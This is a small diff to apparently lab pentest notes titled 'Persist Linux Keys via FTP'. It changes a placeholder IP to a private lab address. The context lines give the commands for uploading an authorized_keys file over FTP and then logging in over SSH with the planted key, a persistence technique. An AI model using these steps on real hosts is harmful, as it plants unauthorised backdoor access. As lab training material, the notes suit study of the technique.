@@ -23,7 +23,7 @@ Persist Linux Keys via FTP
 
 cat ~/lab/bob/.ssh/id_rsa.pub ~/lab/bob/authorized_keys 
 cd ~/lab/bob/
-ftp 10.x.x.x 
+ftp 192.168.200.5
 user 
 pass 
 cd bob        ..Go to bob home directory
@@ -33,4 +33,3 @@ put authorized_keys
 exit 
 ssh -i ~/lab/bob/.ssh/id_rsa bob@192.168.200.5 
 
- 
